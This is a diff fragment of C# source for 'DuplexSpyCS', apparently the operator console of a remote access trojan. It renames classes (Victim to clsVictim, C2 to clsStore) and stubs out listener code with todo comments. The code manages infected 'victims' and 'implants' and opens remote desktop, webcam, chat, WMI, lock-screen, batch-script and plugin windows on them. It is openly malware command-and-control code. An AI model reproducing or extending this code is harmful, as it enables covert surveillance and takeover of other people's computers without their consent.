                                 Invoke(new Action(() =>
                                 {
                                     SaveFileDialog sfd = new SaveFileDialog();
@@ -1321,7 +1323,7 @@ namespace DuplexSpyCS
                             }
                             else
                             {
-                                MessageBox.Show(Crypto.b64D2Str(msg), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                                MessageBox.Show(clsCrypto.b64D2Str(msg), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             }
                         }
                     }
@@ -1353,7 +1355,7 @@ namespace DuplexSpyCS
                 else if (cmd[0] == "dll")
                 {
                     int nCode = int.Parse(cmd[1]);
-                    string szMsg = Crypto.b64D2Str(cmd[2]);
+                    string szMsg = clsCrypto.b64D2Str(cmd[2]);
                     MessageBox.Show(szMsg);
                 }
 
@@ -1370,18 +1372,18 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "error")
                 {
-                    C2.sql_conn.WriteErrorLogs(v, Crypto.b64D2Str(cmd[1]));
+                    clsStore.sql_conn.WriteErrorLogs(v, clsCrypto.b64D2Str(cmd[1]));
                 }
 
                 #endregion
             }
             catch (Exception ex)
             {
-                C2.sql_conn.WriteSysErrorLogs(ex.Message);
+                clsStore.sql_conn.WriteSysErrorLogs(ex.Message);
             }
         }
 
-        private void fnImplantConnected(Listener l, Victim v, string[] aszMsg)
+        private void fnImplantConnected(clsTcpListener l, clsVictim v, string[] aszMsg)
         {
             ListViewItem item = new ListViewItem(aszMsg[0]);
             item.SubItems.Add(v.socket.RemoteEndPoint.ToString());
@@ -1398,7 +1400,7 @@ namespace DuplexSpyCS
             }));
         }
 
-        private void fnImplantDisconnected(Victim v)
+        private void fnImplantDisconnected(clsVictim v)
         {
             try
             {
@@ -1422,19 +1424,19 @@ namespace DuplexSpyCS
         /// </summary>
         /// <param name="item"></param>
         /// <returns></returns>
-        Victim GetVictim(ListViewItem item)
+        clsVictim GetVictim(ListViewItem item)
         {
-            return (Victim)item.Tag;
+            return (clsVictim)item.Tag;
         }
 
         /// <summary>
         /// Cutoff the selected socket.
         /// </summary>
         /// <param name="v"></param>
-        void Disconnected(Victim v)
+        void Disconnected(clsVictim v)
         {
             v.socket.Close();
-            C2.sql_conn.WriteSystemLogs($"[{C1.DateTimeStrEnglish()}]: Disconnected: {v.ID}");
+            clsStore.sql_conn.WriteSystemLogs($"[{clsTools.DateTimeStrEnglish()}]: Disconnected: {v.ID}");
 
             if (v == null)
                 return;
@@ -1476,7 +1478,7 @@ namespace DuplexSpyCS
             //Config file
             try
             {
-                C2.ini_manager = new IniManager("config.ini");
+                clsStore.ini_manager = new clsIniManager("config.ini");
             }
             catch (FileNotFoundException ex)
             {
@@ -1488,7 +1490,7 @@ namespace DuplexSpyCS
                     ofd.Filter = "INI File(*.ini)|*.ini";
                     if (ofd.ShowDialog() == DialogResult.OK)
                     {
-                        C2.ini_manager = new IniManager(ofd.FileName);
+                        clsStore.ini_manager = new clsIniManager(ofd.FileName);
                     }
                     else
                     {
@@ -1503,20 +1505,10 @@ namespace DuplexSpyCS
                 }
             }
 
-            C2.sql_conn = new SqlConn("data.db"); //Set database.
-            C2.sql_conn.Open();
+            clsStore.sql_conn = new SqlConn("data.db"); //Set database.
+            clsStore.sql_conn.Open();
 
-            listener = new Listener(); //Declare new socket listener.
-
-            timer1.Start(); //Show server listen state at the title.
-            timer2.Start(); //Show sent, received bytes count.
-
-            //listener.Received += Received; //Received event.
-            listener.ReceivedDecoded += Received;
-            listener.Disconencted += Disconnected; //Disconnected event.
-
-            listener.ImplantConnected += fnImplantConnected;
-            listener.Disconencted += fnImplantDisconnected;
+            //todo: load listener
 
             //Display remote desktop
             listView1.SmallImageList = il_screen; //Detail mode.
@@ -1525,8 +1517,8 @@ namespace DuplexSpyCS
             screen_width = listView1.Columns[0].Width;
 
             DateTime now = DateTime.Now;
-            C2.dtStartUp = now;
-            C2.sql_conn.NewLogs(SqlConn.CSV.Server, SqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
+            clsStore.dtStartUp = now;
+            clsStore.sql_conn.NewLogs(SqlConn.CSV.Server, SqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -1539,7 +1531,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 frmManager f = new frmManager();
                 f.Text = $@"Manager\\{v.ID}";
                 f.Tag = Function.Manager;
@@ -1566,21 +1558,19 @@ namespace DuplexSpyCS
                 int port = f.port;
                 if (listener != null && listener.socket != null && listener.socket.IsBound)
                 {
-                    if (port == listener.port)
+                    if (port == listener.m_nPort)
                     {
                         MessageBox.Show("This port is in used!", "Bind Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                         return;
                     }
 
-                    List<Victim> lsVictim = listView1.Items.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
-                    listener.Stop(lsVictim);
+                    List<clsVictim> lsVictim = listView1.Items.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+                    listener.fnStop();
 
-                    listener = new Listener();
-                    listener.ReceivedDecoded += Received;
-                    listener.Disconencted += Disconnected;
+                    //todo: listener
                 }
 
-                listener.Start(port);
+                listener.fnStart();
             }
         }
 
@@ -1604,7 +1594,7 @@ namespace DuplexSpyCS
                     continue;
                 }
 
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 frmDesktop f = new frmDesktop();
                 f.Text = $@"Desktop\\{v.ID}";
                 f.Tag = Function.Desktop;
@@ -1617,7 +1607,7 @@ namespace DuplexSpyCS
         private void timer1_Tick(object sender, EventArgs e)
         {
             Text = $"DuplexSpyCS v1.0.0 by ISSAC | " +
-                $"Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | " +
+                $"Port[{(listener == null || listener.m_nPort == -1 ? string.Empty : listener.m_nPort)}] | " +
                 $"Online[{listView1.Items.Count}] - " +
                 $"Implant[{listView2.Items.Count}] - " +
                 $"Total[{(listView1.Items.Count + listView2.Items.Count)}] | " +
@@ -1657,7 +1647,7 @@ namespace DuplexSpyCS
             {
                 if (item.SubItems[9].Text != "0")
                 {
-                    Victim v = GetVictim(item);
+                    clsVictim v = GetVictim(item);
                     frmWebcam f = new frmWebcam();
                     f.Text = $@"Webcam\\{v.ID}";
                     f.v = v;
@@ -1678,7 +1668,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 frmInfo f = new frmInfo();
                 f.Text = $@"Information\\{v.ID}";
                 f.StartPosition = FormStartPosition.CenterScreen;
@@ -1706,11 +1696,11 @@ namespace DuplexSpyCS
         //UPDATE SENT/RECEIVED BYTES PER SECOND
         private void timer2_Tick(object sender, EventArgs e)
         {
-            toolStripLabel1.Text = $"Sent Bytes[{C2.BytesNormalize(C2.sent_bytes)}]";
-            toolStripLabel2.Text = $"Received Bytes[{C2.BytesNormalize(C2.recv_bytes)}]";
+            toolStripLabel1.Text = $"Sent Bytes[{clsTools.BytesNormalize(clsStore.sent_bytes)}]";
+            toolStripLabel2.Text = $"Received Bytes[{clsTools.BytesNormalize(clsStore.recv_bytes)}]";
 
-            C2.sent_bytes = 0;
-            C2.recv_bytes = 0;
+            clsStore.sent_bytes = 0;
+            clsStore.recv_bytes = 0;
         }
 
         //SHOW LOGS
@@ -1743,7 +1733,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 frmChat f = new frmChat();
                 f.Text = $@"Chat\\{v.ID}";
                 f.Tag = Function.Chat;
@@ -1760,7 +1750,7 @@ namespace DuplexSpyCS
             if (listView1.SelectedItems.Count == 0)
                 return;
 
-            List<Victim> list = new List<Victim>();
+            List<clsVictim> list = new List<clsVictim>();
             foreach (ListViewItem item in listView1.SelectedItems)
                 list.Add(GetVictim(item));
 
@@ -1779,7 +1769,7 @@ namespace DuplexSpyCS
             if (listView1.SelectedItems.Count == 0)
                 return;
 
-            List<Victim> l_victim = new List<Victim>();
+            List<clsVictim> l_victim = new List<clsVictim>();
             foreach (ListViewItem item in listView1.SelectedItems.Cast<ListViewItem>().Where(x => x.SubItems[9].Text != "0").ToArray())
                 l_victim.Add(GetVictim(item));
 
@@ -1801,7 +1791,7 @@ namespace DuplexSpyCS
         //MULTI - LOCK SCREEN
         private void toolStripMenuItem17_Click(object sender, EventArgs e)
         {
-            List<Victim> l_victim = new List<Victim>();
+            List<clsVictim> l_victim = new List<clsVictim>();
             if (l_victim.Count == 0)
                 return;
 
@@ -1887,7 +1877,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 frmWMI f = new frmWMI();
                 f.StartPosition = FormStartPosition.CenterScreen;
                 f.Tag = Function.WMI;
@@ -1915,7 +1905,7 @@ namespace DuplexSpyCS
         //MULTI - RUN BATCH SCRIPT
         private void toolStripMenuItem23_Click(object sender, EventArgs e)
         {
-            List<Victim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
             if (lsVictim.Count == 0)
                 return;
 
@@ -1932,7 +1922,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 frmPower f = new frmPower();
                 f.StartPosition = FormStartPosition.CenterScreen;
                 f.v = v;
@@ -1977,7 +1967,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 v.Send(0, 1, string.Empty);
             }
         }
@@ -1986,7 +1976,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 v.Send(0, 0, string.Empty);
             }
         }
@@ -2011,7 +2001,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                Victim v = GetVictim(item);
+                clsVictim v = GetVictim(item);
                 Process.Start("explorer.exe", $"\"{v.dir_victim}\"");
             }
         }
@@ -2046,7 +2036,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem32_Click(object sender, EventArgs e)
         {
-            List<Victim> lsVictim = new List<Victim>();
+            List<clsVictim> lsVictim = new List<clsVictim>();
             foreach (ListViewItem item in listView1.SelectedItems)
                 lsVictim.Add(GetVictim(item));
 
@@ -2111,7 +2101,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem40_Click(object sender, EventArgs e)
         {
-            List<Victim> lsVictim = fnlsGetSelectedVictims();
+            List<clsVictim> lsVictim = fnlsGetSelectedVictims();
             if (lsVictim.Count == 0)
                 return;
 
@@ -2131,7 +2121,7 @@ namespace DuplexSpyCS
         //Implant - Invoke
         private void toolStripMenuItem42_Click(object sender, EventArgs e)
         {
-            List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
+            List<clsVictim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
             if (lVictim.Count == 0)
                 return;
 
@@ -2141,15 +2131,26 @@ namespace DuplexSpyCS
         //Implant - Disconnect
         private void toolStripMenuItem43_Click(object sender, EventArgs e)
         {
-            List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
+            List<clsVictim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
 
             Task.Run(() =>
             {
-                foreach (Victim v in lVictim)
+                foreach (clsVictim v in lVictim)
                 {
                     v.encSend(0, 0, clsEZData.fnGenerateRandomStr());
                 }
             });
+        }
+
+        private void toolStripMenuItem44_Click(object sender, EventArgs e)
+        {
+            List<clsVictim> ls = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            
+            foreach (var victim in ls)
+            {
+                frmPlugin f = new frmPlugin(victim);
+                f.Show();
+            }
         }
     }
 }
